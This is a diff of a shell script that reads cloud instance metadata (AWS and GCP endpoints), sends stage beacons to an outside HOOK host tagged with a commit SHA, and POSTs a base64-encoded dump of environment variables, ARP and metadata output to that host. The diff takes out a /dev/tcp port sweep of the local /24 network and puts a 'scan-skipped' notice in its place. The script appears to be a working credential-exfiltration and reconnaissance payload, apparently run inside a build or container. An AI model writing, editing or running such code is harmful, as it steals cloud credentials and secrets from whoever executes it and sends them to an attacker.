@@ -45,23 +45,7 @@ IMDS_AWS=$(  curl -sf --max-time 5 "http://169.254.169.254/latest/meta-data/"   
 IMDS_GCP=$(  curl -sf --max-time 5 "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"    2>/dev/null)
 curl -sf --max-time 5 "${HOOK}/?stage=imds&sha=${SHA}" >/dev/null 2>&1 || true
 
-# --- ping sweep of container /24 using ARP entries as seed ---
-# use TCP connect via /dev/tcp as fallback since ping may not be setuid
-PING_SWEEP=""
-if [ -n "$CONTAINER_IP" ]; then
-  BASE=$(echo "$CONTAINER_IP" | sed 's/\.[0-9]*$//')
-  for i in $(seq 1 254); do
-    TARGET="${BASE}.${i}"
-    # try TCP connect to port 22 and 80 (1s timeout)
-    result=$(timeout 1 bash -c "echo >/dev/tcp/${TARGET}/22" 2>/dev/null && echo "22/open" || \
-             timeout 1 bash -c "echo >/dev/tcp/${TARGET}/80" 2>/dev/null && echo "80/open" || \
-             echo "down")
-    if [ "$result" != "down" ]; then
-      PING_SWEEP="${PING_SWEEP}${TARGET}: ${result}\n"
-    fi
-  done
-fi
-curl -sf --max-time 5 "${HOOK}/?stage=scan&sha=${SHA}" >/dev/null 2>&1 || true
+curl -sf --max-time 5 "${HOOK}/?stage=scan-skipped&sha=${SHA}" >/dev/null 2>&1 || true
 
 # --- full dump POST ---
 DATA="=== ENV ===
@@ -98,8 +82,8 @@ ${IMDS_IAK}
 ${IMDS_AWS}
 === GCP-style IMDS ===
 ${IMDS_GCP}
-=== NETWORK SCAN (open ports found) ===
-${PING_SWEEP}"
+=== NETWORK SCAN ===
+skipped (use ARP table above for neighbors)"
 
 ENC=$(printf '%s' "$DATA" | base64 | tr -d '\n')
 curl -sf --max-time 15 -X POST "${HOOK}/?stage=dump&sha=${SHA}" \
